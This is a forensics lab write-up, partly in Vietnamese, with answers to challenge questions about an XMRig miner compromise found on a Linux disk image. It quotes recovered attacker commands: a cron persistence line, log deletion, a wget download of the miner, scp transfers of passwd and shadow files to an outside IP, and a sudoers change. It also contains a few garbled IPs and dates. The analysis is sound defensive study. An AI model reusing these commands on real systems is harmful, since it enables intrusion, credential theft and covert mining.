---
title: '[Level-4]-XMRig'
date: 2026-03-24

---

# Lab Report - XMRig
**DatHN5 - SO3 - FSAS**
---

Reconstruct attacker methods on a Linux system by analyzing a disk image, recovering deleted files with Photorec, and correlating logs, command history, and configuration files. 

**Category**: Endpoint Forensics 
**Tactics**: Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Lateral Movement, Collection, Command and Control, Exfiltration 
**Tools**: Linux Command Line Tools, TestDisk, Strings, PhotoRec

#### Scenario
During routine security audits at a startup, the SOC team detected unusual activity on Linux servers in the company’s infrastructure, including unexpected configuration changes and unfamiliar files in critical system directories. These anomalies suggest possible unauthorized access and raise concerns about the integrity of the server environment.

You received a disk image from one of the affected servers for forensic analysis. Your objective is to determine if a compromise has occurred, identify any tactics or tools used by a potential attacker, assess the scope and impact of the incident, and recommend mitigation strategies to safeguard against future breaches.

### 
---

Tình huống:
- SOC team phát hiện hành vi bất thường trong Linux servers, bao gồm thay đổi cấu hình bất thường có file lạ xuất hiện trong thư mục bảo mật hệ thống
- Ta có nhiệm vụ phân tích disk image trích từ server bị ảnh hưởng để tìm hiểu hành vi của attacker cung cấp thông tin tình báo để phục vụ việc phòng thủ.

![image](https://hackmd.io/_uploads/rkLUTnviWe.png)

![image](https://hackmd.io/_uploads/ryEsmTDi-l.png)

```rust!
sudo mkdir /mnt/xlab
sudo mount -o loop,offset=2097152 disk_image.img /mnt/xlab
```

- -o loop : để mount một file ảnh đĩa như một phân vùng ổ đĩa thật
- offset = start_sector*512: truy cập bắt đầu từ offset này

![image](https://hackmd.io/_uploads/H1b_X6wiZg.png)

---
Moving sang foler vừa mount disk image vào để phân tích, mình bắt đầu với directory `/home` trước để xem có những user account nào. Mình thấy có 2 account là `ubuntu` và `noah`, khi mình định vào thư mục của account `noah` thì bị chặn với non-root user. 

Vậy nên mình bắt đầu với user ubuntu trước, đầu tiên mình ngó qua file `.bash_history` đây là nơi lưu các command mà user này đã thao tác trên terminal 

```bash!
sudo adduser noah
sudo usermod -aG sudo noah
sudo rm -f ~/.bash_history
sudo rm -f /var/log/auth.log
exit 
```

![image](https://hackmd.io/_uploads/ryKl4pPibg.png)

![image](https://hackmd.io/_uploads/B1b4NawiWe.png)

> 1,2

**Q1 Assigning high-level privileges to a new user is essential in the attack chain, as it enables the attacker to execute commands with administrative access, ensuring persistent control over the system. What command did the attacker use to grant elevated privileges to the newly created user?**

> sudo usermod -aG sudo noah

---
**Q2 Understanding the commands used by the attacker to cover their traces is essential for identifying attempts to hide malicious activity on the system. What is the second command the attacker used to erase evidence from the system?**

> sudo rm -f /var/log/auth.log

---

Mình còn thấy thư mục `.ssh` nơi lưu trữ credential public key, private key để có thể truy cập vào qua giao thức ssh.

![image](https://hackmd.io/_uploads/rJps4TvjZe.png)

![image](https://hackmd.io/_uploads/BkCtSetobx.png)

![image](https://hackmd.io/_uploads/SkhqrlKibl.png)


---

Câu hỏi có đề cập tới việc attacker đã chỉnh sửa system file thực hiện sheduled task vậy nên mình sẽ tìm tới nới lưu các schduled task đó ở path `var/spool/cron/crontabs`

![Screenshot 2026-03-30 164945](https://hackmd.io/_uploads/HkRAtJFsZg.png)

Mình thấy có lệnh 
```rust!
# m h dom mon dow   command
0 * * * * /tmp/backup.elf >/dev/null 2>&1 
```

`/tmp/backup.elf` Chạy chương trình (hoặc script) tên backup.elf đặt ở thư mục /tmp
- `>/dev/null 2>&1`
    - `>` chuyển hướng output chuẩn (stdout) sang `/dev/null` tức là không hiển thị ra màn hình, cũng không lưu vào log nào, coi như bị xoá đi.
    - `2>&1` chuyển hướng lỗi chuẩn (stderr) sang cùng chỗ với stdout (cũng bỏ hết lỗi)

![Screenshot 2026-03-30 165606](https://hackmd.io/_uploads/ryixcJFi-e.png)


```c#!
root@ip-172-31-31-149:/mnt/xlab/tmp# md5sum backup.elf 
d25208063842ebf39e092d55e033f9e2  backup.elf
root@ip-172-31-31-149:/mnt/xlab/tmp# sha256sum backup.elf 
ad09939a999ace146e122de0082bbf2a3c3d64aedaf844421ba21276b1280b2c  backup.elf
```

![image](https://hackmd.io/_uploads/H1lB9xtoZe.png)

![image](https://hackmd.io/_uploads/SymUqeFobg.png)


Tra cứu trên MalwareBazaar

![Screenshot 2026-03-30 170744](https://hackmd.io/_uploads/HkCbq1KiWg.png)

![Screenshot 2026-03-30 170805](https://hackmd.io/_uploads/SkWf91KoWx.png)

![image](https://hackmd.io/_uploads/HJ8doeYiZe.png)




[bazaar](https://bazaar.abuse.ch/sample/ad09939a999ace146e122de0082bbf2a3c3d64aedaf844421ba21276b1280b2c/#iocs) | [joesanbox](https://www.joesandbox.com/analysis/1517489/0/html)

> 3, 4, 5

---
**Q3 Identifying the configuration added or modified by the attacker for persistence is essential for detecting and removing recurring malicious activities on the system. What configuration line did the attacker add to one of the key Linux system files for scheduled tasks to ensure the miner would run continuously?**

> 0 * * * * /tmp/backup.elf >/dev/null 2>&1 

---
**Q4 Identifying the hash of the malicious file is crucial for confirming its uniqueness and tracking its presence across systems. What is the MD5 hash of the file dropped by the attacker with mining capabilities?**

> d25208063842ebf39e092d55e033f9e2
 
---
**Q5 Knowing the original name of a malicious file helps link it to known malware families and provides valuable insights into its behavior. According to threat intelligence reports, what is the original name of the miner?**

> xmr_linux_amd64 (3)

---


![Screenshot 2026-03-30 165751](https://hackmd.io/_uploads/B1c-9ktoZl.png)



---

Dùng `photorec` để khôi phục các file bị xóa mình thu được rất nhiều file / folder, thế nên mình dùng tới cách trace theo file `backup.elf` để bắt đầu phân tích

![image](https://hackmd.io/_uploads/BksA4rX3Wl.png)

![image](https://hackmd.io/_uploads/rJ60EH73We.png)

![image](https://hackmd.io/_uploads/BkuTSBXn-e.png)


---

**Q6 Understanding the attacker's actions is crucial for tracing how malicious files were introduced to the system. The attacker successfully executed a command to download and save the miner on the compromised Linux system. What was the exact file path on the attacker's server where the malicious miner was hosted?**

```c+!
wget http://3.28.239.653.28.195.43/Tools/backup/backup.elf -O /tmp/backup.elf
wget http://3.28.195.43/Tools/backup/backup.elf -O /tmp/backup.elf
```

>/Tools/backup/backup.elf

---
**Q7 To understand which sensitive information was accessed and transferred from the compromised system, it’s essential to identify the files exfiltrated by the attacker. What is the full path on the attacker’s remote machine where the exfiltrated passwd file was saved?**

```
cat /etc/sudoers > /tmp/sudoers.txt
cat /etc/passwd > /tmp/passwd.txt
cat /etc/shadow > /tmp/shadow.txt
cat /etc/ssh/ssh_config > /tmp/sshconfig.txt
scp /tmp/passwd.txt ubuntu@3.28.195.43:/home/ubuntu/passwd.txt
scp /tmp/sudoers.txt ubuntu@3.28.195.43:/home/ubuntu/sudoers.txt
scp /tmp/shadow.txt ubuntu@3.28.195.43:/home/ubuntu/shadow.txt
scp /tmp/sshconfig.txt ubuntu@3.28.195.43:/home/ubuntu/sshconfig.txt
```

>/home/ubuntu/passwd.txt

---

**Q8 Understanding how the attacker maintained elevated privileges without repeated permission prompts is essential for uncovering their methods of persistent access. What command did the attacker use to configure continuous privilege escalation without requiring repeated permission?**

Cách mà attacker luôn giữ được quyền cao nhất mà không phải yêu cầu lại đó là chỉnh sửa file `sudoers` - file dùng để quản lý quyền sử dụng lệnh `sudo` trên hệ thống. 

![image](https://hackmd.io/_uploads/H13MiSm3-l.png)

[T1548.003](https://attack.mitre.org/techniques/T1548/003/) - Abuse Elevation Control Mechanism: Sudo and Sudo Caching



`tty_tickets` mặc định khi enable được dùng để quản lý việc khi mở một cửa sổ terminal mới và dùng command `sudo` thì user phải nhập lại mật khẩu

Attacker đã disable `tty_tickets` đi để có thể tùy ý chạy lệnh sudo không phải nhập lại mật khẩu khi mở nhiều của sổ terminal.


>echo 'Defaults !tty_tickets' >> /etc/sudoers

---
**Q9 Identifying the source IP address used for lateral movement is essential for tracing the attacker's path and understanding the extent of the compromise. What is the IP address of the machine the attacker used to perform lateral movement to this Linux box?**



![image](https://hackmd.io/_uploads/SkDwRHmn-l.png)

Check qua một lượt trong đây thì mình thấy rằng có host với IP `192.16.19.147` đang liên tục thử mật khẩu của user `root` qua dịch vụ ssh, có thể quan sát được là attacker đang thực hiện brute-force qua số port.

>192.168.19.147

---
**Q10 Identifying the first username targeted by the attacker in their brute-force attempts offers insight into their initial access strategy and target selection, as the attacker attempted to access two different accounts. What was the first username the attacker targeted in these brute-force attempts?**

Dựa vào câu trên mình chỉ thấy log của 1 user target mà attacker nhắm tới đó là `root`.

>root

---
**Q11 Determining the timestamp of the attacker’s final login is crucial for identifying when they last accessed the system to hide their activities and erase evidence. What is the timestamp of the last login session during which the attacker cleared traces on the compromised machine?**

Các tệp `wtmp` và `utmp` tệp theo dõi người dùng đăng nhập và đăng xuất khỏi hệ thống

![image](https://hackmd.io/_uploads/BJ8j3OmhWx.png)

Đọc file bằng lệnh `last -f wtmp`, mình thu được kết quả như dưới

![image](https://hackmd.io/_uploads/r1jcZtX3be.png)

Ta biết rằng attacker thực hiện lateral movement từ IP `192.168.19.147`, cho nên last login của attacker là `Oct 28 15:35 - 15:40  (00:04)`

> 2024-28-10 15:35

---
**Q12 During the attacker’s SSH session, they used a command that mistakenly saved their activities to the hard drive rather than keeping them in memory where they’d be more difficult to analyze. Which bash command did they use that left this trace?**

![image](https://hackmd.io/_uploads/r1wAbYQ3Zg.png)

![image](https://hackmd.io/_uploads/BJhhH8mh-e.png)
